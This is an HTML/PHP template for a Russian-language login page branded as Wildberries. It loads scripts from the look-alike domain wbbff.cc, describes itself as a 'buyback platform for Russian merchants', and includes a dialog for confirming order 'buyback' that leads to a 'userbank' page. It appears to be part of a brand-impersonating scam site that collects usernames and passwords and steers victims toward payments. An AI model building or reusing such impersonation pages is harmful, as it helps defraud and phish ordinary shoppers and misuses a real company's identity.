<!DOCTYPE html
	PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" class="pixel-ratio-2 retina">

<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
	<title>Войти - Wildberries</title>
	<meta name="keywords" content="Платформа обратного выкупа для российских торговцев">
	<meta name="description"
		content="Коллекции женской, мужской и детской одежды, обуви, а также товары для дома и спорта. Информация о доставке и оплате. Таблицы размеров, советы по уходу за вещами.">
	<meta name="format-detection" content="telephone=no">
	<link rel="shortcut icon" type="image/ico" href="https://wbbff.cc/favicon.ico">
	<link type="text/css" rel="stylesheet" href="<?php echo asset("assets/style.css")?>">
	<script type="text/javascript" src="<?php echo asset("assets/jquery.js")?>"></script>
	<script type="text/javascript" src="<?php echo asset("assets/global.js")?>"></script>
	<script type="text/javascript" src="<?php echo asset("assets/arttpl.js")?>"></script>
	<link href="<?php echo asset("assets/layer.css")?>" type="text/css" rel="styleSheet" id="layermcss">
</head>

<body>
	<style>
		body {
			background: #FFF !important;
		}
	</style>

	<div class="login_top">
		<div class="zc_tt">Войти</div>
		<div class="top_dl"><img src="<?php echo asset("assets/2023030618234816700b.png")?>"></div>
		<a class="u_fh" href="<?php echo route("index") ?>"><i class="sy_ico"></i></a>
	</div>
	<form method="post" id="form">
		@csrf
		<div class="zc_box1" style="padding:0 10px">
			<div class="zc_list">
				<div class="zc_mal zc_i1"><input type="text" name="login" class="zc_input1"
						placeholder="Введите имя пользователя"></div>
			</div>
			<div class="zc_list">
				<div class="zc_mal zc_i2"><input type="text" name="password" class="zc_input1" placeholder="пароль"
						onfocus="this.type='password'"></div>
			</div>
		</div>
		<div class="loginbtn" style="margin:30px 20px;">
			<input type="hidden" name="pesubmit">
			<input type="button" value="Войти">
		</div>
	</form>
	<div class="zh_zc1">
		<a href="<?php echo route('auth.register') ?>" class="mar10">зарегистрироваться</a> |
		<!-- <a href="https://wbbff.cc/user.php?mod=do&act=getpw" class="mal10">забыть пароль</a>  | -->
		<a href="" target="_blank" class="mal10">Поддержка</a>
	</div>
	<script type="text/javascript">
		$(function () {
			$(":button").click(function () {
				if ($(":input[name='login']").val() == '') {
					app_tip("Введите имя пользователя");
					return false;
				}
				if ($(":input[name='password']").val() == '') {
					app_tip("Введите пароль");
					return false;
				}
				$(this).val("в войти.");
				app_submit("<?php echo route("user.api.login") ?>", function (json) {
					console.log(json)
					if (json.message == "User logged in successfully") {
						if ('' != '') {
							app_open('', 1000);
						}
						else {
							app_open("<?php echo route("index") ?>", 1000);
						}
					}
					else {
						$(":button").val("Войти");
					}
				})
			})
		})
	</script>
	<link rel="stylesheet" href="<?php echo asset("assets/weui.min.css")?>">
	<link rel="stylesheet" href="<?php echo asset("assets/jquery-weui.min.css")?>">
	<script src="<?php echo asset("assets/jquery-weui.js")?>"></script>
	<script type="text/javascript" src="<?php echo asset("assets/layer.js")?>"></script>
	<script type="text/javascript" src="<?php echo asset("assets/app.js")?>"></script>
	<script type="text/javascript">
		//顶部菜单点击
		function top_menu() {
			if ($("#top_menu").is(":hidden")) {
				$("#top_menu").show();
			}
			else {
				$("#top_menu").hide();
			}
			$("#top_menu a").live("click", function () {
				$("#top_menu").hide();
			})
		}
		pe_loadscript("https://wbbff.cc/api.php?mod=cron");
	</script>
	<script>
		function confirm_huigou(order_id) {
			layer.open({
				content: "Определить выкуп этого Заказ？",
				btn: ["OK", "Отмена"],
				shadeClose: false,
				yes: function () {

					/*layer.open({
						content: '你点了确认',
						time: 1
					});*/
					$.ajax({
						type: "POST",
						url: "./user.php?mod=order&act=huigou_do",
						dataType: "json",
						data: {
							'order_id': order_id,
						},
						success: function (res) {
							console.log(res);

							if (res.result == false) {
								layer.open({
									content: res.msg,
									time: 3,
									skin: 'msg',
									end: function () {
										location.href = './user.php?mod=userbank';
									}
								});
							} else {
								layer.open({
									content: res.msg,
									time: 2,
									skin: 'msg',
									end: function () {
										location.reload();
									}
								});
							}
						}
					});
				}

			});
		}    
	</script>

</body>

</html>